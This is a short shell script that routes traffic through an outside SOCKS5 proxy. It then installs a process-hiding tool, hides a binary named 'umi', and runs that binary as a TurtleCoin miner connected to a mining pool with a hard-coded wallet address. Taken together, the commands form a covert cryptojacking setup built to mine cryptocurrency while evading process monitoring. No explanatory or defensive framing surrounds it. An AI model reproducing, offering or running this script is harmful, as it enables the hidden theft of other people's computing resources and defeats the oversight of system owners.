apt update 
apt install proxychains  -y 
sed -i 's/socks4/socks5/' /etc/proxychains.conf 
sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
sed -i 's/9050/10663/' /etc/proxychains.conf
apt install nodejs
node –version
apt install npm
npm –version 
npm i -g node-process-hider
chmod u+x umi
ph add umi
./umi --donate-level 1 -o de.turtlecoin.herominers.com:1160 -u TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps+57b556a426f1d8edc56d41fbda69d9f6a1d4e2d55f53d955e2b0dc17b1599cee -p cici -a argon2/chukwav2 -k 
